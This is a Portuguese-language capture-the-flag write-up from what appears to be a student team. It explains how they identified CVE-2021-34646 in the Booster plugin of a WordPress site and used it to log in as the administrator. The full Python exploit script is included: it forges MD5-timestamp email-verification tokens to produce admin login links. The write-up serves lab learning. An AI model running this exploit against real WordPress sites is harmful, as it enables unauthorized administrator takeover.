# CTF3

O objetivo dos desafios desta semana era encontrar uma flag que seria revelada, após conseguir encontrar e explorar uma vulnerabilidade do website WordPress. Também havia certa informação sobre qual vulnerabilidade é que seria usada, pois tinha de ser uma relacionada em fazer login no WordPress com uma conta de admin, usando um exploit conhecido.
## Processo usado
 - ### Recolhimento de informacao através do site em questão:
    - #### Wordpress versão 5.8.1
    - #### Wordpress Plugin versão 5.7.3
    - #### Booster for Wordpress versão 5.4.3
    - #### Administrador com conta no site

 - ### Pesquisa por vulnerabilidade

Após analisar todos os fatores do 1º passo, nós começámos a procurar por vulnerabilidades no sistema, com base no que considerámos ser mais frágil de explorar.

Passado algum tempo de pesquisa, verificámos que a vulnerabilidade relacionada com Booster for Wordpress era um fator com que poderiamos explorar com maior facilidade.

 - ### Escolha da vulnerabilidade

 A escolha da vulnerabilidade também se relaciona com o nosso objetivo principal, que é entrar numa conta de admin no processo de login, e o exploit é algo familiar para nós.

 Tendo isto em mente acabámos por escolher o CVE-2021-34646, que através de uma vulnerabilidade do Booster for Wordpress, seria possível nós passarmos por um outro utilizador, nomeadamente um administrador, e no processo de login ativar um pedido de verificação de entrada na conta para o email. A verdadeira fraqueza encontra-se no random token generator, que gera um token único para cada conta, não estar optimizado para este tipo de ataque.

 [CVE-2021-34646](https://nvd.nist.gov/vuln/detail/CVE-2021-34646)

 Introduzimos o CVE na submissão de desafio 1 no formato desejado, assim concluindo esta etapa do processo.

 - ### Encontrar um exploit

 Após ter encontrado a vulnerabilidade, tivemos, então, de encontrar um exploit da mesma. Utilizando o website Exploit Database, conseguimos encontrar um exemplo de um exploit e o resto desta etapa baseou-se no recolhimento de informação sobre este exploit e como aproveitar dele. 

 Também associámos este recolhimento de informação ao recolhimento de informações do próprio site de WordPress que fizemos na primeira etapa. Concluimos que o utilizador com ID igual a 1 seria o da conta de administrador e com este conhecimento conseguimos ser mais precisos na exploração da vulnerabilidade em causa.
Codigo do exploit:

```python
import requests,sys,hashlib
import argparse
import datetime
import email.utils
import calendar
import base64

B = "\033[94m"
W = "\033[97m"
R = "\033[91m"
RST = "\033[0;0m"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the base url")
parser.add_argument('id', type=int, help='the user id', default=1)
args = parser.parse_args()
id = str(args.id)
url = args.url
if args.url[-1] != "/": # URL needs trailing /
        url = url + "/"

verify_url= url + "?wcj_user_id=" + id
r = requests.get(verify_url)

if r.status_code != 200:
        print("status code != 200")
        print(r.headers)
        sys.exit(-1)

def email_time_to_timestamp(s):
    tt = email.utils.parsedate_tz(s)
    if tt is None: return None
    return calendar.timegm(tt) - tt[9]

date = r.headers["Date"]
unix = email_time_to_timestamp(date)

def printBanner():
    print(f"{W}Timestamp: {B}" + date)
    print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
    print("We need to generate multiple timestamps in order to avoid delay related timing errors")
    print("One of the following links will log you in...\n")

printBanner()


for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
        hash = hashlib.md5(str(unix-i).encode()).hexdigest()
        print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
        token='{"id":"'+ id +'","code":"'+hash+'"}'
        token = base64.b64encode(token.encode()).decode()
        token = token.rstrip("=") # remove trailing =
        link = url+"my-account/?wcj_verify_email="+token
        print(link + f"\n{RST}")
```

 - ### Explorar a vulnerabilidade

 Agora que já organizámos todas as nossa ideias e conhecimentos sobre a vulnerabilidade e o exploit, tornou-se altura de o pôr em prática. Correndo, assim, o código de python ,o exploit da vulnerabilidade, conseguimos aceder a da conta de administrador (ID igual a 1) usando o link do WordPress que é nos dado no moodle como argumento do comando e o ID do administrador(tipicamente 1) como o ultimo argumento, recebendo no terminal 3 links, que pelo menos um deles iria dar acesso ao website já com a conta de administrador. 
![image](https://media.discordapp.net/attachments/1153998326274994216/1166681375554928650/image.png?ex=654b5fb3&is=6538eab3&hm=066380603f282d49b8d10ebdffa7312ec3ff69879313640cba5783029f6af1e7&=&width=744&height=458)

 Depois de já estar dentro do WordPress com a conta de administrador, o resto desta etapa e deste desafio resumiu-se em clicar num link fornecido no moodle, que nos leva direto à flag que era a solução deste desafio, já que estavamos com acesso da conta de admin a partir do momento que conseguimos fazer login.

![image2](https://media.discordapp.net/attachments/1153998326274994216/1166681425278414878/image.png?ex=654b5fbf&is=6538eabf&hm=ce864ee6dac1ff40003f224aa314ba5f941d11dcff0e1793eeb379342113dc72&=&width=731&height=458)
![image3](https://cdn.discordapp.com/attachments/1153998326274994216/1166681695634849862/image.png?ex=654b6000&is=6538eb00&hm=5ad0611c25e087e347735c5282c6539f4448c6b99f7d7354c04e7bb2386ab8de&)
